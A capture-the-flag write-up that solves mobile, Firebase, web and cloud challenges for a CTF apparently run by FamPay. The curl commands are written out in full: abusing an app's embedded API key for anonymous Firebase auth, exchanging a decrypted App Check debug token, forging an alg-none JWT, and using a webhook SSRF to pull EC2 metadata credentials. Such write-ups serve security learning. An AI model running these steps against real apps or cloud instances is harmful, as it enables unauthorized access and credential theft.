# Static Analysis:

>So we got a apk file, we first unzip it

```bash
unzip fam-ctf.apk -d unziped
```

>we got a bunch of files, but we can see a app native library
>*lib/arm64-v8a/libfam.so*
>and after making it readable

```bash
strings unziped/lib/arm64-v8a/libfam.so | grep FAM
```

```
FAM{str1ngs_d0nt_l13_1n_n4t1v3_l4nd}
```

# Firebase:

>After decompiling the apk file from JADX, we found config information

```bash
<string name="firebase_database_url">https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app</string>
```

>it says "The door is open to anyone. You don't need a name to enter, but the room still has a lock.", but it denies on a simply curl request

```bash
curl 'https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json'
{
  "error" : "Permission denied"
}
```

>after using the google api key

```bash
<string name="google_api_key">AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww</string>
```

```bash
 curl -X POST \
  'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww' \
  -H 'Content-Type: application/json' \
  -d '{"returnSecureToken":true}'
{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkwNGIwZjkxYmU2ZWIwODY3ZGFiYmFhYjU4N2RmYzJlMzNmMDBhMjQiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYW0tY3RmIiwiYXVkIjoiZmFtLWN0ZiIsImF1dGhfdGltZSI6MTc5MzE2MjkwMywidXNlcl9pZCI6InBwenZ2RDQ2SWdTZXdwRjBjbHUxTTVEamVnNzMiLCJzdWIiOiJwcHp2dkQ0NklnU2V3cEYwY2x1MU01RGplZzczIiwiaWF0IjoxNzkzMTYyOTAzLCJleHAiOjE3OTMxNjY1MDMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiYW5vbnltb3VzIn19.zs1V3LgOgacEiPbRdFyvNisgeadrUTf_BCb1QuCpEJihtVw_b7jfStSQigEp_PtEZnbUMhzr2LZwg2_myQ5f3SdGNKKj3Q6DATMbUCq-IqbONPRLSsCxWXqtL_EeVmOY4ueyzVE8W4k0kZ93RJrliZf0pep5EdgHvGj6cvsOO2wLoLMPqm4dI7irNw_ASb0vhjoHZrj4eiDXp1IdvCf8FFbL8YO8D3R-YuqgsW2M_iiryd95e-Wx0XAvIbZHvTcOlaCTjq5BXgXQKujRDXqdF-O5VWKOJNZV8iFAEVOHuWr2jH-wzkd7XYRyl3npEMDHAMBSIWKd5I-AWJJhIcKM6g",
  "refreshToken": "AMf-vBx5HfTYIm9Qani2wLsS69WKwSvE97Yy-ozQg5Pm-6-izZ0RdlZQYpbDIEfAwDo5_qXqXJNq1CSWmH4etqp3Rx_zE2gEcOIo3SeNgwuIFGrHeIukbF08iv1-N98FBojFkOECo0prKO0X6BKMpXdn-epACX_YYfOU3VGwFokuReLgfRYVelI",
  "expiresIn": "3600",
  "localId": "ppzvvD46IgSewpF0clu1M5Djeg73"
}
```

>we found a token, and using it as the auth parameter, we got the flag

```bash
curl 'https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json?auth=eyJhbGciOiJSUzI1NiIsImtpZCI6IjkwNGIwZjkxYmU2ZWIwODY3ZGFiYmFhYjU4N2RmYzJlMzNmMDBhMjQiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYW0tY3RmIiwiYXVkIjoiZmFtLWN0ZiIsImF1dGhfdGltZSI6MTc5MzE2MjkwMywidXNlcl9pZCI6InBwenZ2RDQ2SWdTZXdwRjBjbHUxTTVEamVnNzMiLCJzdWIiOiJwcHp2dkQ0NklnU2V3cEYwY2x1MU01RGplZzczIiwiaWF0IjoxNzkzMTYyOTAzLCJleHAiOjE3OTMxNjY1MDMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiYW5vbnltb3VzIn19.zs1V3LgOgacEiPbRdFyvNisgeadrUTf_BCb1QuCpEJihtVw_b7jfStSQigEp_PtEZnbUMhzr2LZwg2_myQ5f3SdGNKKj3Q6DATMbUCq-IqbONPRLSsCxWXqtL_EeVmOY4ueyzVE8W4k0kZ93RJrliZf0pep5EdgHvGj6cvsOO2wLoLMPqm4dI7irNw_ASb0vhjoHZrj4eiDXp1IdvCf8FFbL8YO8D3R-YuqgsW2M_iiryd95e-Wx0XAvIbZHvTcOlaCTjq5BXgXQKujRDXqdF-O5VWKOJNZV8iFAEVOHuWr2jH-wzkd7XYRyl3npEMDHAMBSIWKd5I-AWJJhIcKM6g'
"FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}"
```

>Now onto the vault, "The vault trusts no one it hasn't met. But the app already made introductions. Something in the code proves who you are."

>I used objdump on libfam.so, the native libary for app,

```bash
objdump -d --start-address=0x61d8 --stop-address=0x63c0 libfam.so

libfam.so:     file format elf64-x86-64


Disassembly of section .text:

0000000000006260 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base-0x70>:
    6260:       48 8d 3d 69 7e 00 00    lea    0x7e69(%rip),%rdi        # e0d0 <fwrite@plt+0x1010>
    6267:       e9 e4 69 00 00          jmp    cc50 <__cxa_finalize@plt>
    626c:       0f 1f 40 00             nopl   0x0(%rax)
    6270:       c3                      ret
    6271:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    6278:       00 00 00
    627b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
    6280:       e9 eb ff ff ff          jmp    6270 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base-0x60>
    6285:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    628c:       00 00 00
    628f:       90                      nop
    6290:       48 85 ff                test   %rdi,%rdi
    6293:       74 02                   je     6297 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base-0x39>
    6295:       ff e7                   jmp    *%rdi
    6297:       c3                      ret
    6298:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
    629f:       00
    62a0:       48 89 fe                mov    %rdi,%rsi
    62a3:       48 8d 3d e6 ff ff ff    lea    -0x1a(%rip),%rdi        # 6290 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base-0x40>
    62aa:       48 8d 15 1f 7e 00 00    lea    0x7e1f(%rip),%rdx        # e0d0 <fwrite@plt+0x1010>
    62b1:       e9 aa 69 00 00          jmp    cc60 <__cxa_atexit@plt>
    62b6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    62bd:       00 00 00
    62c0:       48 8d 0d 09 7e 00 00    lea    0x7e09(%rip),%rcx        # e0d0 <fwrite@plt+0x1010>
    62c7:       e9 a4 69 00 00          jmp    cc70 <__register_atfork@plt>
    62cc:       cc                      int3
    62cd:       cc                      int3
    62ce:       cc                      int3
    62cf:       cc                      int3

00000000000062d0 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base>:
    62d0:       55                      push   %rbp
    62d1:       48 89 e5                mov    %rsp,%rbp
    62d4:       48 83 ec 60             sub    $0x60,%rsp
    62d8:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    62df:       00 00
    62e1:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    62e5:       48 89 7d d8             mov    %rdi,-0x28(%rbp)
    62e9:       48 89 75 d0             mov    %rsi,-0x30(%rbp)
    62ed:       48 8d 35 7f cc ff ff    lea    -0x3381(%rip),%rsi        # 2f73 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base-0x335d>
    62f4:       48 8d 7d e0             lea    -0x20(%rbp),%rdi
    62f8:       48 89 7d a8             mov    %rdi,-0x58(%rbp)
    62fc:       e8 7f 69 00 00          call   cc80 <_ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2IDnEEPKc@plt>
    6301:       48 8b 7d a8             mov    -0x58(%rbp),%rdi
    6305:       48 8b 45 d8             mov    -0x28(%rbp),%rax
    6309:       48 89 45 b0             mov    %rax,-0x50(%rbp)
    630d:       e8 0e 01 00 00          call   6420 <_ZN7_JNIEnv12NewStringUTFEPKc@@Base+0x30>
    6312:       48 8b 7d b0             mov    -0x50(%rbp),%rdi
    6316:       48 89 c6                mov    %rax,%rsi
    6319:       e8 72 69 00 00          call   cc90 <_ZN7_JNIEnv12NewStringUTFEPKc@plt>
    631e:       48 89 45 b8             mov    %rax,-0x48(%rbp)
    6322:       e9 00 00 00 00          jmp    6327 <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base+0x57>
    6327:       48 8d 7d e0             lea    -0x20(%rbp),%rdi
    632b:       e8 70 69 00 00          call   cca0 <_ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED1Ev@plt>
    6330:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    6337:       00 00
    6339:       48 8b 4d f8             mov    -0x8(%rbp),%rcx
    633d:       48 39 c8                cmp    %rcx,%rax
    6340:       0f 85 28 00 00 00       jne    636e <Java_com_ctf_fam_MainActivity_getSecretFromNative@@Base+0x9e>
    6346:       48 8b 45 b8             mov    -0x48(%rbp),%rax
    634a:       48 83 c4 60             add    $0x60,%rsp
    634e:       5d                      pop    %rbp
    634f:       c3                      ret
    6350:       48 89 c1                mov    %rax,%rcx
    6353:       89 d0                   mov    %edx,%eax
    6355:       48 89 4d c8             mov    %rcx,-0x38(%rbp)
    6359:       89 45 c4                mov    %eax,-0x3c(%rbp)
    635c:       48 8d 7d e0             lea    -0x20(%rbp),%rdi
    6360:       e8 3b 69 00 00          call   cca0 <_ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED1Ev@plt>
    6365:       48 8b 7d c8             mov    -0x38(%rbp),%rdi
    6369:       e8 82 2e 00 00          call   91f0 <_ZNSt6__ndk111char_traitsIcE6assignERcRKc@@Base+0x210>
    636e:       e8 3d 69 00 00          call   ccb0 <__stack_chk_fail@plt>
    6373:       cc                      int3
    6374:       cc                      int3
    6375:       cc                      int3
    6376:       cc                      int3
    6377:       cc                      int3
    6378:       cc                      int3
    6379:       cc                      int3
    637a:       cc                      int3
    637b:       cc                      int3
    637c:       cc                      int3
    637d:       cc                      int3
    637e:       cc                      int3
    637f:       cc                      int3

0000000000006380 <_ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2IDnEEPKc@@Base>:
    6380:       55                      push   %rbp
    6381:       48 89 e5                mov    %rsp,%rbp
    6384:       48 83 ec 40             sub    $0x40,%rsp
    6388:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    638f:       00 00
    6391:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    6395:       48 89 7d e0             mov    %rdi,-0x20(%rbp)
    6399:       48 89 75 d8             mov    %rsi,-0x28(%rbp)
    639d:       48 8b 7d e0             mov    -0x20(%rbp),%rdi
    63a1:       48 89 7d c8             mov    %rdi,-0x38(%rbp)
    63a5:       48 8d 75 f0             lea    -0x10(%rbp),%rsi
    63a9:       48 8d 55 e8             lea    -0x18(%rbp),%rdx
    63ad:       e8 0e 69 00 00          call   ccc0 <_ZNSt6__ndk117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_EC2INS_18__default_init_tagESA_EEOT_OT0_@plt>
    63b2:       48 8b 7d d8             mov    -0x28(%rbp),%rdi
    63b6:       48 89 7d d0             mov    %rdi,-0x30(%rbp)
    63ba:       e8 11 69 00 00          call   ccd0 <_ZNSt6__ndk111char_traitsIcE6lengthEPKc@plt>
    63bf:       48                      rex.W
```

>we search for .rodata section in decompiler, and found a 36 byte cipher text, and the key, and after some python, we got a token

```
8F76557D-A35A-4B51-94D4-D0DF98D79B55
```

```bash
curl -X POST \
  'https://firebaseappcheck.googleapis.com/v1/projects/674578159678/apps/1:674578159678:android:775058d15777caf841996f:exchangeDebugToken' \
  -H 'Content-Type: application/json' \
  -H 'X-Goog-Api-Key: AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww' \
  -d '{"debug_token":"8F76557D-A35A-4B51-94D4-D0DF98D79B55"}'
{
  "ttl": "3600s",
  "token": "eyJraWQiOiJBNzFLSHciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjY3NDU3ODE1OTY3ODphbmRyb2lkOjc3NTA1OGQxNTc3N2NhZjg0MTk5NmYiLCJhdWQiOlsicHJvamVjdHMvNjc0NTc4MTU5Njc4IiwicHJvamVjdHMvZmFtLWN0ZiJdLCJwcm92aWRlciI6ImRlYnVnIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzY3NDU3ODE1OTY3OCIsImV4cCI6MTc5MzE2NzY4NiwiaWF0IjoxNzkzMTY0MDg2LCJqdGkiOiJBd2N0NGJzV211dU9YQkxIZUZxRGZoMTZiUWl2LUNESUdzX210TGsyTzd3In0.PGQXNvj4eA0fT0N6aYplY-Z1M0N7WBKXnoGb5Ey18rNOcQ9sF8jKmWunZkAqCvOB-v0Q6mtz-Q40lx-ZI2FbrD6mEPnIUUIz2HtALcJBI535JJwDsh-3XC_OZM1j_gPb10xkF-tTt9QAke2HIEhAVLVQ8SqOquepHNItSJ71E2gKBBE846Y-vZGlxTXrqMXejs2U_XCNA8EG6PWPwWXEzRAeUz79is1HmAa2LTASA-OvTiNhZ1M9OuoBUqmCdm7LaKomDt_hZ4R24SxDbgke5k4NWwdx603-cSMRiGBj2F-imroK3xUrmUHhKZrCLzOIUcRpvW38hYtYXpr6wjPQMDCy1Yp5xGXLIAEJABOW2CyC_Bb1FKaY-Og5BtVtMDY6JbnUtxPRdZFR-70NOkocxlk5ThrWwBJW53QUlA0odEL_SEUaLIH9lkW9IDsTNFoivFAlQgL1BPF1oqBTl1StNdC4KMGZwwcOBC1f2sk9bY1IwFdg2ea5tp4LDVikegvG"
}
```

>we got the flag

```
FAM{4pp_ch3ck_byp4ss_g00d_j0b}
```

# Web:

>"NexaVault is an internal credential management portal used by engineering teams.

Only **administrators** can open the Vault — a restricted area holding classified project data.

You have been given access to create an account. That's it.

> `https://ctf.fampay.co/famctf/`"

>I made a new random account, and a very common  method of auth bypassing, I got the JWT login token of my account, used jwt debugger to make a new token where I am admin
>Used burp to send the token to server

![[{5DD120A6-9D04-4345-9881-5A3D4C574417}.png]]

```
FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}
```
# Dynamic Analysis:

>I used a little research and this took a little time: but I got the key: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188

```bash
 curl -X POST 'https://ctf.fampay.co/api/check' \
  -H 'Content-Type: application/json' \
  -H 'X-Signature: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188' \
  -d '{"username":"admin"}'
{"flag": "FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}", "message": "Welcome, admin."}
```

# Cloud:

An internal DevOps monitoring dashboard was accidentally deployed with debug endpoints enabled on a public-facing EC2 instance.

The platform team stores sensitive configuration in an S3 bucket. Your goal: get the flag from the bucket.

`hint: debug endpoints reveal more than intended. The instance knows who it is.`

Note: `try using instance 30 sec after you get ip. settingup thing takes time`

>I got a dashboard, showing multiple endpoints

```HTML
/metrics/config

{  
"flags": { "debug_endpoints": true, "metrics_auth": false, "webhook_enabled": true },  
"identity": {  
"imds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  
"provider": "ec2-instance-metadata"  
},  
"storage": {  
"backend": "s3",  
"bucket": "fam-ctf-cloud-challenge",  
"prefix": "players/937",  
"region": "ap-south-1",  
"access": "instance-role",  
"note": "bucket access restricted to requests originating from within vpc"  
}  
}
```

>got the token

```bash
curl -X PUT \  
"http://13.206.97.33/internal/webhook?url=http://instance-data/latest/api/token" \  
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

{"body":"AQAEAM1GpzMNtWftTvsgIGSOU0RDyU1AA26anAMKbe8Cd-l_nuzn7Q=","status":200,"url":"http://instance-data/latest/api/token"}
```

>with this token, I got AccessKeyId, SecretAccessKey, Token for aws, I made a python script to implement aws sig4, and got the flag

```
FAM{cl0ud_ssrf_imds_016052f0756a}
```

